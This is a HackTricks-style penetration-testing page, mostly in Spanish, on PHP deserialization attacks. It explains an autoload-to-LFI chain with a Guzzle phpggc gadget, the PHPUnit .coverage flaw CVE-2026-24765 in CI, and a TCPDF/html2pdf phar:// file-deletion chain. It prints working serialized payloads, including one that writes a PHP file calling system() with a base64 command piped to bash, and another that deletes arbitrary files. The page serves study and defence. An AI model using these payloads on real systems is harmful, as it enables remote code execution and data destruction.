# PHP - Deserialization + Autoload Classes

{{#include ../../banners/hacktricks-training.md}}

Primero, debes comprobar qué son las [**Autoloading Classes**](https://www.php.net/manual/en/language.oop5.autoload.php).

## PHP deserialization + spl_autoload_register + LFI/Gadget

Estamos en una situación en la que encontramos una **PHP deserialization in a webapp** con **no** librería vulnerable a gadgets dentro de **`phpggc`**. Sin embargo, en el mismo contenedor había una **different composer webapp with vulnerable libraries**. Por lo tanto, el objetivo era **load the composer loader of the other webapp** y abusar de él para **load a gadget that will exploit that library with a gadget** desde la webapp vulnerable a deserialization.

Steps:

- Has encontrado una **deserialization** y **no** hay ningún gadget en el código de la app actual
- Puedes abusar de una función **`spl_autoload_register`** como la siguiente para **load any local file with `.php` extension**
- Para ello usas una deserialization donde el nombre de la clase irá dentro de **`$name`**. No puedes usar "/" o "." en el nombre de una clase en un objeto serializado, pero el **code** está **replacing** los **underscores** ("_") por **slashes** ("/"). Así, un nombre de clase como `tmp_passwd` será transformado en `/tmp/passwd.php` y el código intentará cargarlo.\  
A **gadget example** será: **`O:10:"tmp_passwd":0:{}`**

<details>
<summary>spl_autoload_register LFI/autoload example</summary>
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
</details>

> [!TIP]
> Si tienes un **file upload** y puedes subir un archivo con **`.php` extension** podrías **abusar de esta funcionalidad directamente** y obtener RCE de inmediato.

En mi caso, no tenía nada así, pero dentro del **mismo contenedor** había otra aplicación web usando composer con una **librería vulnerable a un gadget `phpggc`**.

- Para cargar esa otra librería, primero necesitas **cargar el composer loader de esa otra aplicación web** (ya que el de la aplicación actual no accederá a las librerías de la otra). **Conociendo la ruta de la aplicación**, puedes lograrlo muy fácilmente con: **`O:28:"www_frontend_vendor_autoload":0:{}`** (En mi caso, el composer loader estaba en `/www/frontend/vendor/autoload.php`)
- Ahora puedes **cargar** el **app composer loader** de la otra, así que es momento de **`generate the phpgcc`** el **payload** a usar. En mi caso usé **`Guzzle/FW1`**, que me permitió **escribir cualquier archivo en el sistema de archivos**.
- NOTA: El **gadget generado no funcionaba**, para que funcionara **modifiqué** ese payload **`chain.php`** de phpggc y cambié **todos los atributos** de las clases **de private a public**. Si no, después de deserializar la cadena, los atributos de los objetos creados no tenían ningún valor.
- Ahora tenemos la forma de **load the others app composer loader** y disponer de un **phpggc payload que funciona**, pero necesitamos **hacer esto en la MISMA REQUEST para que el loader se cargue cuando se use el gadget**. Para ello, envié un array serializado con ambos objetos como:
- Puedes ver **primero el loader cargándose y luego el payload**
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
- Ahora, podemos **create and write a file**, sin embargo, el usuario **couldn’t write in any folder inside the web server**. Por lo tanto, como puedes ver en el payload, PHP que llama a **`system`** con algo de **base64** se crea en **`/tmp/a.php`**. Después, podemos **reuse the first type of payload** que usamos como LFI para cargar el composer loader del otro webapp t**o load the generated `/tmp/a.php`** file. Simplemente añádelo al deserialization gadget:
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{} }
```
**Resumen del payload**

- **Load the composer autoload** de una webapp diferente en el mismo contenedor
- **Load a phpggc gadget** para abusar de una librería de la otra webapp (la webapp inicial vulnerable a deserialización no tenía ningún gadget en sus librerías)
- El gadget **creará un archivo con un PHP payload** en /tmp/a.php con comandos maliciosos (el usuario de la webapp no puede escribir en ninguna carpeta de ninguna webapp)
- La parte final de nuestro payload usará **load the generated php file** que ejecutará comandos

Tuve que **call this deserialization twice**. En mis pruebas, la primera vez el archivo `/tmp/a.php` se creó pero no se cargó, y la segunda vez se cargó correctamente.

### Novedades recientes de phpggc (2025)

- La **phpggc master branch sigue añadiendo chains**: OpenCart/RCE2, Drupal/FD1/SQLI1/XXE1, WordPress/YoastSEO/FW1 y otros llegaron en 2025 — útil cuando la app objetivo comparte código vendor con esos proyectos. Una forma rápida de buscar es `phpggc -l | grep -E "OpenCart|Drupal|Yoast"` (actualiza tu clon primero).
- Cuando mezcles gadgets entre apps vía autoloading, recuerda que **private properties in gadget definitions may be dropped** cuando las clases se redeclaran de forma distinta en el target; edita el gadget’s `chain.php` para hacer las propiedades `public` si el payload llega con valores vacíos (mismo truco mostrado arriba).

## Deserialización de .coverage de PHPUnit PHPT (entrypoint CI/CD)

`phpunit` antes de **8.5.52 / 9.6.34 / 10.5.63 / 11.5.50 / 12.5.8** (CVE-2026-24765) deserializaba objetos PHP arbitrarios desde archivos `.coverage` producidos por el **PHPT runner**. En pipelines de CI donde contribuidores no confiables pueden subir tests, dejar un `.coverage` manipulado desencadena la deserialización tan pronto la suite se ejecute — no se necesita acceso web.

**Flujo del ataque**

1. Colocar un archivo `.coverage` malicioso en el repo (o artifact) que contenga un gadget serializado que exista en las dependencias de test (por ejemplo, una chain de Monolog o Guzzle desde phpggc).
2. Enviar un PR; cuando CI ejecute `phpunit --configuration phpunit.xml`, el PHPT runner lee el archivo coverage y deserializa el gadget, dando **RCE dentro del contenedor del runner**.
3. Esto es especialmente peligroso cuando los tests montan secretos de CI (credenciales cloud, llaves de despliegue).

**Stub mínimo de .coverage malicioso** (colócalo junto a un test PHPT):
```php
<?php
$payload = file_get_contents('php://stdin'); // serialized gadget from phpggc
file_put_contents('exploit.coverage', $payload);
```
Ejecuta el PHPT para que phpunit consuma `exploit.coverage`.

## TCPDF `__destruct` POP chain for arbitrary file deletion

Cuando una instancia real de `TCPDF` es recolectada por el recolector de basura, llama a `_destroy(true)`, itera sobre `$this->imagekeys` y llama a `unlink()` sobre cualquier cosa que parezca un archivo de caché bajo `K_PATH_CACHE`. Si una aplicación realiza `unserialize($user_data)` mientras la clase `TCPDF` está cargada (p. ej. espera un array con una clave `html`), puedes suministrar un objeto serializado que establezca:

- `file_id` a cualquier entero que no esté presente en `self::$cleaned_ids` (p. ej. `-1`).
- `imagekeys` a rutas que comiencen con `K_PATH_CACHE` o que puedan hacerse para parecerlo (p. ej. `/tmp/../tmp/do_not_delete_this_file.txt` cuando `K_PATH_CACHE` es `/tmp/`).

Ejemplo de payload que explota un flujo inseguro `unserialize($_GET['p']); $pdf->writeHTML($payload['html']);`:
```text
a:1:{s:4:"html";O:5:"TCPDF":2:{s:7:"file_id";i:-1;s:9:"imagekeys";a:1:{i:0;s:39:"/tmp/../tmp/do_not_delete_this_file.txt";}}}
```
### Activar el gadget vía `phar://` en las etiquetas `<cert>` de html2pdf

`spipu/html2pdf` (≤5.3.0) envuelve a TCPDF y expone un bloque `<cert>` personalizado cuyos atributos `src`/`privkey` se validan con `file_exists()` simple. En PHP < 8.0 cualquier función de sistema de archivos que toque una URL `phar://` provoca que los metadatos de Phar se deserialicen. Al almacenar el objeto TCPDF malicioso anterior dentro de un archivo Phar obtienes un POP fiable incluso si la aplicación nunca llama a `unserialize()` por sí misma.

1. Crea un Phar con `phar.readonly=0`, configura el stub/manifest para que parezca una imagen (p. ej. renombra `archive.phar` a `archive.png`) y guarda el objeto TCPDF serializado en los metadatos del Phar.
2. Sube/coloca el archivo en un lugar accesible como `/tmp/user_files/user_1/archive.png`.
3. Envía HTML que contenga la etiqueta CERT para que html2pdf resuelva la ruta controlada por el atacante:
```html
<cert src="phar:///tmp/user_files/user_1/archive.png"
privkey="phar:///tmp/user_files/user_1/archive.png" />
```
La llamada a `file_exists()` deserializa los metadatos, instancia TCPDF, y su destructor elimina el archivo elegido, convirtiendo html2pdf en un potente punto de entrada `phar://`. La versión 5.3.1 añadió `Security::checkValidPath()` para bloquear esquemas no aprobados, por lo que los despliegues heredados siguen siendo atractivos.

## Referencias

- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)
- [GitLab Advisory – CVE-2024-51058 TCPDF Hash Comparison / Phar Deserialization](https://advisories.gitlab.com/pkg/composer/tecnickcom/tcpdf/)
- [CVE-2026-24765 – PHPUnit PHPT Coverage Unsafe Deserialization](https://cvereports.com/reports/CVE-2026-24765)

{{#include ../../banners/hacktricks-training.md}}
